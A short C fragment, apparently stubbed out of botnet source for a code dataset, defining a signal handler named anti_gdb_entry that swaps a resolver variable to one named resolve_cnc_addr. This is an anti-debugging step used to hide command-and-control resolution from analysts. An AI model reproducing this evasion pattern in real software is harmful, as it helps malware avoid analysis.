
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int resolve_cnc_addr ;
 int resolve_func ;

__attribute__((used)) static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}
